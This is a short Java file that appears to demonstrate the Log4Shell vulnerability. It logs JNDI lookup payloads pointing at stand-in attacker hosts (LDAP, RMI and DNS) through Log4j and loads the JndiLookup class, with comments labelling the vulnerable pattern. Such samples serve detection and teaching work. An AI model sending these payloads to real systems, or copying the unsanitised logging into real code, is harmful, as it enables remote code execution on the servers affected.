import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jExploitExample {
    private static final Logger logger = LogManager.getLogger(Log4jExploitExample.class);

    public static void main(String[] args) {
        // Simulated vulnerable Log4j exploit
        String userInput = "${jndi:ldap://malicious-server.com/exploit}";

        // Logging user input directly (vulnerable pattern)
        logger.error("User input received: " + userInput);

        // Another potential attack vector using RMI
        String remoteCode = "${jndi:rmi://attacker.com/hack}";
        logger.warn("Remote input: " + remoteCode);

        // Debugging log with JNDI, still vulnerable
        logger.debug("Debug info: ${jndi:dns://evil.com/exploit}");

        // Simulated use of the vulnerable Log4j JndiLookup class
        try {
            Class<?> lookupClass = Class.forName("org.apache.logging.log4j.core.lookup.JndiLookup");
            logger.info("JndiLookup class loaded: " + lookupClass.getName());
        } catch (Exception e) {
            logger.error("Failed to load JndiLookup class", e);
        }
    }
}
